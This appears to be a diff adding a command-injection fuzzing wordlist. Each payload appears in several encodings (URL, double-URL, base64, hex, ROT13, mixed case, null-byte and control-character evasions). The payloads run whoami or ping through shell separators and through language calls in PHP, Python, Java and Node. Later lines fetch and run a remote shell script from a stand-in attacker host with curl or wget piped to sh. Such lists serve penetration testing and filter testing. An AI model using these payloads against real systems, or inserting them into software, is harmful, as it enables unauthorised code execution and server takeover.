+%60%7Cping%20-n%204%20127.0.0.1
+%2560%257Cping%2520-n%25204%2520127.0.0.1
+YHxwaW5nIC1uIDQgMTI3LjAuMC4x
+607c70696e67202d6e2034203132372e302e302e31
+`|cvat -a 4 127.0.0.1
+`|PIng -N 4 127.0.0.1
+%0c`%0c|ping -n 4 1%2027.0.0.1
+`&ping -n 4 127.0.0.1
+%60%26ping%20-n%204%20127.0.0.1
+%2560%2526ping%2520-n%25204%2520127.0.0.1
+YCZwaW5nIC1uIDQgMTI3LjAuMC4x
+602670696e67202d6e2034203132372e302e302e31
+`&cvat -a 4 127.0.0.1
+`&PiNg -n 4 127.0.0.1
+`&ping %0a-n 4 127.0%0b.0.1
+ping -n 4 127.0.0.1
+ping%20-n%204%20127.0.0.1
+ping%2520-n%25204%2520127.0.0.1
+cGluZyAtbiA0IDEyNy4wLjAuMQ==
+70696e67202d6e2034203132372e302e302e31
+cvat -a 4 127.0.0.1
+PiNg -n 4 127.0.0.1
+%00pi%20ng -n 4 12%207.0.0.1
+.system('whoami')
+.system%28%27whoami%27%29
+.system%2528%2527whoami%2527%2529
+LnN5c3RlbSgnd2hvYW1pJyk=
+2e73797374656d282777686f616d692729
+.flfgrz('jubnzv')
+.sySTeM('WHOAMI')
+.syst%09em('whoami%0c')
+;system('whoami')
+%3Bsystem%28%27whoami%27%29
+%253Bsystem%2528%2527whoami%2527%2529
+O3N5c3RlbSgnd2hvYW1pJyk=
+3b73797374656d282777686f616d692729
+;flfgrz('jubnzv')
+;system('whOAmI')
+;s%0cystem('whoami'%00)
+system('whoami')
+system%28%27whoami%27%29
+system%2528%2527whoami%2527%2529
+c3lzdGVtKCd3aG9hbWknKQ==
+73797374656d282777686f616d692729
+flfgrz('jubnzv')
+SySTeM('WHOaMi')
+.exec('whoami')
+.exec%28%27whoami%27%29
+.exec%2528%2527whoami%2527%2529
+LmV4ZWMoJ3dob2FtaScp
+2e65786563282777686f616d692729
+.rkrp('jubnzv')
+.Exec('wHoAMi')
+;exec('whoami')
+%3Bexec%28%27whoami%27%29
+%253Bexec%2528%2527whoami%2527%2529
+O2V4ZWMoJ3dob2FtaScp
+3b65786563282777686f616d692729
+;rkrp('jubnzv')
+;EXEc('wHOaMI')
+;exec(%0d'%20whoami%20')
+exec('whoami')
+exec%28%27whoami%27%29
+exec%2528%2527whoami%2527%2529
+ZXhlYygnd2hvYW1pJyk=
+65786563282777686f616d692729
+rkrp('jubnzv')
+EXEc('wHOaMi')
+e%20xec('w%09hoa%20mi')
+.shell_exec('whoami')
+.shell_exec%28%27whoami%27%29
+.shell_exec%2528%2527whoami%2527%2529
+LnNoZWxsX2V4ZWMoJ3dob2FtaScp
+2e7368656c6c5f65786563282777686f616d692729
+.furyy_rkrp('jubnzv')
+.SHelL_eXec('WhOaMi')
+.shell_exec('wh%00oami')
+;shell_exec('whoami')
+%3Bshell_exec%28%27whoami%27%29
+%253Bshell_exec%2528%2527whoami%2527%2529
+O3NoZWxsX2V4ZWMoJ3dob2FtaScp
+3b7368656c6c5f65786563282777686f616d692729
+;furyy_rkrp('jubnzv')
+;shElL_eXEC('WhoAMi')
+;shell_exe%0cc('whoami')
+shell_exec('whoami')
+shell_exec%28%27whoami%27%29
+shell_exec%2528%2527whoami%2527%2529
+c2hlbGxfZXhlYygnd2hvYW1pJyk=
+7368656c6c5f65786563282777686f616d692729
+furyy_rkrp('jubnzv')
+ShELl_eXEc('WhOAmi')
+.passthru('whoami')
+.passthru%28%27whoami%27%29
+.passthru%2528%2527whoami%2527%2529
+LnBhc3N0aHJ1KCd3aG9hbWknKQ==
+2e7061737374687275282777686f616d692729
+.cnffgueh('jubnzv')
+.PaSSTHru('WHOAMi')
+.%0bpasst%00h%0bru('whoami')
+;passthru('whoami')
+%3Bpassthru%28%27whoami%27%29
+%253Bpassthru%2528%2527whoami%2527%2529
+O3Bhc3N0aHJ1KCd3aG9hbWknKQ==
+3b7061737374687275282777686f616d692729
+;cnffgueh('jubnzv')
+;pASSthru('WhoaMI')
+;%0apassth%00ru('whoam%0ci')
+passthru('whoami')
+passthru%28%27whoami%27%29
+passthru%2528%2527whoami%2527%2529
+cGFzc3RocnUoJ3dob2FtaScp
+7061737374687275282777686f616d692729
+cnffgueh('jubnzv')
+PassThrU('WhoaMI')
+pas%0dsthru('whoami')
+.eval('system(\"whoami\")')
+.eval%28%27system%28%5C%22whoami%5C%22%29%27%29
+.eval%2528%2527system%2528%255C%2522whoami%255C%2522%2529%2527%2529
+LmV2YWwoJ3N5c3RlbShcIndob2FtaVwiKScp
+2e6576616c282773797374656d285c2277686f616d695c22292729
+.riny('flfgrz(\"jubnzv\")')
+.EVAl('SyStEM(\"WHoAmI\")')
+.eval('system(\"whoa%0bm%00i\")')
+;eval('system(\"whoami\")')
+%3Beval%28%27system%28%5C%22whoami%5C%22%29%27%29
+%253Beval%2528%2527system%2528%255C%2522whoami%255C%2522%2529%2527%2529
+O2V2YWwoJ3N5c3RlbShcIndob2FtaVwiKScp
+3b6576616c282773797374656d285c2277686f616d695c22292729
+;riny('flfgrz(\"jubnzv\")')
+;evaL('sySTEm(\"wHOaMi\")')
+;eva%20l%0c('sys%0dtem(\"wh%0doami\")')
+eval('system(\"whoami\")')
+eval%28%27system%28%5C%22whoami%5C%22%29%27%29
+eval%2528%2527system%2528%255C%2522whoami%255C%2522%2529%2527%2529
+ZXZhbCgnc3lzdGVtKFwid2hvYW1pXCIpJyk=
+6576616c282773797374656d285c2277686f616d695c22292729
+riny('flfgrz(\"jubnzv\")')
+EVAl('SysTEM(\"whOaMi\")')
+ev%20al('system(%09\"whoami\")')
+os.system('whoami')
+os.system%28%27whoami%27%29
+os.system%2528%2527whoami%2527%2529
+b3Muc3lzdGVtKCd3aG9hbWknKQ==
+6f732e73797374656d282777686f616d692729
+bf.flfgrz('jubnzv')
+OS.SyStem('wHoAmi')
+os.system('whoami'%20)
+subprocess.call(['whoami'], shell=True)
+subprocess.call%28%5B%27whoami%27%5D%2C%20shell%3DTrue%29
+subprocess.call%2528%255B%2527whoami%2527%255D%252C%2520shell%253DTrue%2529
+c3VicHJvY2Vzcy5jYWxsKFsnd2hvYW1pJ10sIHNoZWxsPVRydWUp
+73756270726f636573732e63616c6c285b2777686f616d69275d2c207368656c6c3d5472756529
+fhocebprff.pnyy(['jubnzv'], furyy=Gehr)
+SuBProCEsS.caLL(['wHoAMi'], sHEll=tRue)
+subprocess%00.call(['whoami'], shell=True)
+exec('import os; os.system(\"whoami\")')
+exec%28%27import%20os%3B%20os.system%28%5C%22whoami%5C%22%29%27%29
+exec%2528%2527import%2520os%253B%2520os.system%2528%255C%2522whoami%255C%2522%2529%2527%2529
+ZXhlYygnaW1wb3J0IG9zOyBvcy5zeXN0ZW0oXCJ3aG9hbWlcIiknKQ==
+657865632827696d706f7274206f733b206f732e73797374656d285c2277686f616d695c22292729
+rkrp('vzcbeg bf; bf.flfgrz(\"jubnzv\")')
+ExEC('IMport Os; os.sySTeM(\"wHoAMI\")')
+exec('import o%00s;%00 os.sys%09tem(\"whoami\"%00)')
+Runtime.getRuntime().exec("whoami")
+Runtime.getRuntime%28%29.exec%28%22whoami%22%29
+Runtime.getRuntime%2528%2529.exec%2528%2522whoami%2522%2529
+UnVudGltZS5nZXRSdW50aW1lKCkuZXhlYygid2hvYW1pIik=
+52756e74696d652e67657452756e74696d6528292e65786563282277686f616d692229
+Ehagvzr.trgEhagvzr().rkrp("jubnzv")
+RunTimE.gETrUNtiMe().exeC("whOaMI")
+R%0duntime.ge%0dtRuntime().ex%0cec("whoami%0d")
+new ProcessBuilder("whoami").start()
+new%20ProcessBuilder%28%22whoami%22%29.start%28%29
+new%2520ProcessBuilder%2528%2522whoami%2522%2529.start%2528%2529
+bmV3IFByb2Nlc3NCdWlsZGVyKCJ3aG9hbWkiKS5zdGFydCgp
+6e65772050726f636573734275696c646572282277686f616d6922292e73746172742829
+arj CebprffOhvyqre("jubnzv").fgneg()
+new pROCEsSbUiLdEr("WHoAMI").StaRt()
+ne%0cw ProcessB%0cuilde%0dr("whoami").%0ds%20tart()
+;require('child_process').exec('whoami')
+%3Brequire%28%27child_process%27%29.exec%28%27whoami%27%29
+%253Brequire%2528%2527child_process%2527%2529.exec%2528%2527whoami%2527%2529
+O3JlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCd3aG9hbWknKQ==
+3b7265717569726528276368696c645f70726f6365737327292e65786563282777686f616d692729
+;erdhver('puvyq_cebprff').rkrp('jubnzv')
+;reQuire('cHiLD_PROceSS').EXeC('WhoAmi')
+;require%00('child_process').exec('wh%0coa%0cmi')
+,require('child_process').exec('whoami')
+%2Crequire%28%27child_process%27%29.exec%28%27whoami%27%29
+%252Crequire%2528%2527child_process%2527%2529.exec%2528%2527whoami%2527%2529
+LHJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCd3aG9hbWknKQ==
+2c7265717569726528276368696c645f70726f6365737327292e65786563282777686f616d692729
+,erdhver('puvyq_cebprff').rkrp('jubnzv')
+,ReQuIrE('CHild_pROCesS').EXeC('wHoAMI')
+,re%00quir%0ce('child_process').exec('whoa%0cmi')
+require('child_process').exec('whoami')
+require%28%27child_process%27%29.exec%28%27whoami%27%29
+require%2528%2527child_process%2527%2529.exec%2528%2527whoami%2527%2529
+cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3dob2FtaScp
+7265717569726528276368696c645f70726f6365737327292e65786563282777686f616d692729
+erdhver('puvyq_cebprff').rkrp('jubnzv')
+REQuiRE('CHIld_PROcEss').EXEC('WHoAmi')
+require('child_process')%0d.exec('whoami')
+;eval("require('child_process').exec('whoami')")
+%3Beval%28%22require%28%27child_process%27%29.exec%28%27whoami%27%29%22%29
+%253Beval%2528%2522require%2528%2527child_process%2527%2529.exec%2528%2527whoami%2527%2529%2522%2529
+O2V2YWwoInJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCd3aG9hbWknKSIp
+3b6576616c28227265717569726528276368696c645f70726f6365737327292e65786563282777686f616d6927292229
+;riny("erdhver('puvyq_cebprff').rkrp('jubnzv')")
+;Eval("rEqUIre('cHIlD_PROCeSS').exEc('wHoAMI')")
+;%0deval("require('%09child_pro%0ccess').exe%0bc('%0cwhoami%00')")
+,eval("require('child_process').exec('whoami')")
+%2Ceval%28%22require%28%27child_process%27%29.exec%28%27whoami%27%29%22%29
+%252Ceval%2528%2522require%2528%2527child_process%2527%2529.exec%2528%2527whoami%2527%2529%2522%2529
+LGV2YWwoInJlcXVpcmUoJ2NoaWxkX3Byb2Nlc3MnKS5leGVjKCd3aG9hbWknKSIp
+2c6576616c28227265717569726528276368696c645f70726f6365737327292e65786563282777686f616d6927292229
+,riny("erdhver('puvyq_cebprff').rkrp('jubnzv')")
+,eVAl("REqUire('ChiLD_PROCesS').EXec('WhoAMi')")
+,eval(%0d"requir%0ce('%0achi%0bld_proc%0cess').exec('whoami')")
+eval("require('child_process').exec('whoami')")
+eval%28%22require%28%27child_process%27%29.exec%28%27whoami%27%29%22%29
+eval%2528%2522require%2528%2527child_process%2527%2529.exec%2528%2527whoami%2527%2529%2522%2529
+ZXZhbCgicmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ3dob2FtaScpIik=
+6576616c28227265717569726528276368696c645f70726f6365737327292e65786563282777686f616d6927292229
+riny("erdhver('puvyq_cebprff').rkrp('jubnzv')")
+Eval("reqUIrE('chiLD_PRocess').ExEC('WhoAMi')")
+eval("%0brequire('child_%0bprocess').exec('whoami'%0b)")
+; curl http://attacker.com/shell.sh | sh
+%3B%20curl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%253B%2520curl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+OyBjdXJsIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggfCBzaA==
+3b206375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+; phey uggc://nggnpxre.pbz/furyy.fu | fu
+; cuRl htTP://AtTacKER.cOm/sHELL.Sh | Sh
+; cu%0drl http:/%00/attacker.com/shell.sh | sh
+| curl http://attacker.com/shell.sh | sh
+%7C%20curl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%257C%2520curl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+fCBjdXJsIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggfCBzaA==
+7c206375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+| phey uggc://nggnpxre.pbz/furyy.fu | fu
+| curl HttP://aTtACKER.COm/ShElL.SH | Sh
+| curl http://att%20acker.%09com/shell.sh | sh
+|| curl http://attacker.com/shell.sh | sh
+%7C%7C%20curl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%257C%257C%2520curl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+fHwgY3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgc2g=
+7c7c206375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+|| phey uggc://nggnpxre.pbz/furyy.fu | fu
+|| CUrL http://atTAcKEr.COm/SHell.Sh | SH
+|%0b| cu%0arl htt%00p://att%0backer.com/shell.sh | sh
+& curl http://attacker.com/shell.sh | sh
+%26%20curl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%2526%2520curl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+JiBjdXJsIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggfCBzaA==
+26206375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+& phey uggc://nggnpxre.pbz/furyy.fu | fu
+& CURL htTP://aTtAcker.cOM/sHElL.Sh | SH
+& curl http://attacker.com/she%20ll.sh |%09 sh
+&& curl http://attacker.com/shell.sh | sh
+%26%26%20curl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%2526%2526%2520curl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+JiYgY3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgc2g=
+2626206375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+&& phey uggc://nggnpxre.pbz/furyy.fu | fu
+&& curL http://AtTACkeR.CoM/sHeLL.Sh | sh
+&& curl%09 http:%0d//attacker.com/s%20hell.sh |%0d %20sh
+%0acurl http://attacker.com/shell.sh | sh
+%250acurl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%25250acurl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+JTBhY3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgc2g=
+2530616375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+%0nphey uggc://nggnpxre.pbz/furyy.fu | fu
+%0aCUrl HTtp://atTaCker.cOM/SHeLL.SH | sH
+%0acurl http://attacke%00r.com/s%0dhel%09l.s%0bh | sh
+%0Acurl http://attacker.com/shell.sh | sh
+%250Acurl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%25250Acurl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+JTBBY3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgc2g=
+2530416375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+%0Nphey uggc://nggnpxre.pbz/furyy.fu | fu
+%0ACurL HTtp://AttackeR.com/ShELl.sH | Sh
+%0Acur%0al htt%0dp://a%0btt%0aacke%09r.com%0c/shell.sh | sh
+${IFS}curl http://attacker.com/shell.sh | sh
+%24%7BIFS%7Dcurl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%2524%257BIFS%257Dcurl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+JHtJRlN9Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgc2g=
+247b4946537d6375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+${VSF}phey uggc://nggnpxre.pbz/furyy.fu | fu
+${IfS}CUrL htTp://aTTAcKeR.com/sHeLL.SH | Sh
+${IFS}curl h%0bttp://at%00tacker.com/shel%20l.sh | sh
+\ncurl http://attacker.com/shell.sh | sh
+%5Cncurl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+%255Cncurl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+XG5jdXJsIGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggfCBzaA==
+5c6e6375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+\aphey uggc://nggnpxre.pbz/furyy.fu | fu
+\ncUrL http://AttACKER.cOM/shELl.SH | sH
+\ncu%09rl http:/%0b/att%0backer.com/shell.sh | sh
+curl http://attacker.com/shell.sh | sh
+curl%20http%3A//attacker.com/shell.sh%20%7C%20sh
+curl%2520http%253A//attacker.com/shell.sh%2520%257C%2520sh
+Y3VybCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIHwgc2g=
+6375726c20687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368207c207368
+phey uggc://nggnpxre.pbz/furyy.fu | fu
+CURL hTTp://AttackER.coM/ShelL.SH | Sh
+curl%20 http://at%00tacker.%0dcom/she%0cll.sh | sh
+; wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%3B%20wget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%253B%2520wget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+OyB3Z2V0IGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggLU8gL3RtcC9zaGVsbC5zaCAmJiBjaG1vZCAreCAvdG1wL3NoZWxsLnNoICYmIC90bXAvc2hlbGwuc2g=
+3b207767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+; jtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+; WGeT hTtp://AttACKeR.coM/ShELl.sh -O /TMP/shELl.sH && chmod +X /tmp/shElL.Sh && /tMP/ShElL.sh
+; w%0cge%00t %09ht%0btp%20://attac%0dker.com/s%0bh%0bell.sh -O%0b /tmp/shel%0bl.%0ds%20h && %0cchmod +x %0c/t%0bmp%0c/shell.sh && /tmp/shell.s%0dh
+| wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%7C%20wget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%257C%2520wget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+fCB3Z2V0IGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggLU8gL3RtcC9zaGVsbC5zaCAmJiBjaG1vZCAreCAvdG1wL3NoZWxsLnNoICYmIC90bXAvc2hlbGwuc2g=
+7c207767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+| jtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+| WgEt hTTp://aTtACker.CoM/SHelL.Sh -o /tmp/ShEll.SH && ChMOD +X /TMp/sHeLl.sH && /TmP/ShElL.SH
+| wge%20t h%20ttp://attacker.com/shell.sh -O%0b /%00tmp/shel%00l.sh%0a && chmod +x%0b /tmp/%0ashell.sh && /tmp/shell.%0ash
+|| wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%7C%7C%20wget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%257C%257C%2520wget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+fHwgd2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIC1PIC90bXAvc2hlbGwuc2ggJiYgY2htb2QgK3ggL3RtcC9zaGVsbC5zaCAmJiAvdG1wL3NoZWxsLnNo
+7c7c207767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+|| jtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+|| WgEt httP://aTtACkeR.CoM/sHeLL.Sh -o /TMp/sHeLL.SH && ChMoD +X /tmP/ShelL.SH && /TMP/sHelL.Sh
+||%0a wge%09t h%0dttp://attacker.com/shell.sh -O /%0ctmp/shell.%0ash &&%09 chmod +x /tmp/shell%00.sh && /tmp/shell.sh
+& wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%26%20wget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%2526%2520wget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+JiB3Z2V0IGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggLU8gL3RtcC9zaGVsbC5zaCAmJiBjaG1vZCAreCAvdG1wL3NoZWxsLnNoICYmIC90bXAvc2hlbGwuc2g=
+26207767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+& jtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+& WgET hTTP://ATTacKeR.coM/SHELL.sh -o /tMp/sheLL.SH && cHmOd +X /tMP/sheLL.SH && /tmP/sHeLL.sH
+& w%0dget %00http://at%00tacker.com/shell.sh %00-O /t%09mp/shell.sh && chmod %0c+x /tmp/shell.%20sh && /%20t%0cmp/shell.s%00h
+&& wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%26%26%20wget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%2526%2526%2520wget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+JiYgd2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIC1PIC90bXAvc2hlbGwuc2ggJiYgY2htb2QgK3ggL3RtcC9zaGVsbC5zaCAmJiAvdG1wL3NoZWxsLnNo
+2626207767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+&& jtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+&& wGet hTTp://ATtACKER.COm/SHeLL.sh -o /TmP/sHelL.sh && CHmod +x /tmP/ShelL.SH && /Tmp/ShELL.Sh
+&& wget http%0d:%09//attacker.com/shell.sh %0b-O /tmp/s%0chel%09l.sh%0c %0a&& chmod%0b +x /tmp/shell.sh && %0a/tmp/shell.sh
+%0awget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%250awget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%25250awget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+JTBhd2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIC1PIC90bXAvc2hlbGwuc2ggJiYgY2htb2QgK3ggL3RtcC9zaGVsbC5zaCAmJiAvdG1wL3NoZWxsLnNo
+2530617767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+%0njtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+%0awget htTp://AttACKeR.com/sHEll.SH -o /TMP/SheLl.sH && cHMOd +X /tMP/shell.Sh && /tmp/sHELL.Sh
+%0awget htt%0dp://atta%00cker.c%20om%0a/shell.sh -O %0c/tmp/shell.sh && %09chmod +x%0c /tmp/shell.s%00h && %20/tmp/shell.sh
+%0Awget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%250Awget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%25250Awget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+JTBBd2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIC1PIC90bXAvc2hlbGwuc2ggJiYgY2htb2QgK3ggL3RtcC9zaGVsbC5zaCAmJiAvdG1wL3NoZWxsLnNo
+2530417767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+%0Njtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+%0aWget hTtp://atTaCkEr.Com/shell.sh -o /TMp/sheLl.SH && CHMoD +X /tmp/SHEll.SH && /tmP/sHELl.SH
+%0Awget http:%00//attacker.com%0d/s%00hell%0b.%09sh -O /tmp/s%0ahell.sh && chmod %20+x /tmp/shell.s%0ah && /tmp/shell%00.sh
+${IFS}wget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%24%7BIFS%7Dwget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%2524%257BIFS%257Dwget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+JHtJRlN9d2dldCBodHRwOi8vYXR0YWNrZXIuY29tL3NoZWxsLnNoIC1PIC90bXAvc2hlbGwuc2ggJiYgY2htb2QgK3ggL3RtcC9zaGVsbC5zaCAmJiAvdG1wL3NoZWxsLnNo
+247b4946537d7767657420687474703a2f2f61747461636b65722e636f6d2f7368656c6c2e7368202d4f202f746d702f7368656c6c2e73682026262063686d6f64202b78202f746d702f7368656c6c2e7368202626202f746d702f7368656c6c2e7368
+${VSF}jtrg uggc://nggnpxre.pbz/furyy.fu -B /gzc/furyy.fu && puzbq +k /gzc/furyy.fu && /gzc/furyy.fu
+${IFS}WgET HTtp://aTtACKER.COm/sheLL.Sh -o /TMp/SHElL.SH && ChMOd +X /TMP/ShEll.sH && /Tmp/shElL.sh
+${IFS}%20wget http:%0a//atta%0dcke%0br.com/shell.%0bsh -O /t%0cmp/shell.sh && chmod +x /tmp/shell.sh %0b&& /tmp/%09shell.%0ash
+\nwget http://attacker.com/shell.sh -O /tmp/shell.sh && chmod +x /tmp/shell.sh && /tmp/shell.sh
+%5Cnwget%20http%3A//attacker.com/shell.sh%20-O%20/tmp/shell.sh%20%26%26%20chmod%20%2Bx%20/tmp/shell.sh%20%26%26%20/tmp/shell.sh
+%255Cnwget%2520http%253A//attacker.com/shell.sh%2520-O%2520/tmp/shell.sh%2520%2526%2526%2520chmod%2520%252Bx%2520/tmp/shell.sh%2520%2526%2526%2520/tmp/shell.sh
+XG53Z2V0IGh0dHA6Ly9hdHRhY2tlci5jb20vc2hlbGwuc2ggLU8gL3RtcC9zaGVsbC5zaCAmJiBjaG1vZCAreCAvdG1wL3NoZWxsLnNoICYmIC90bXAvc2hlbGwuc2g=
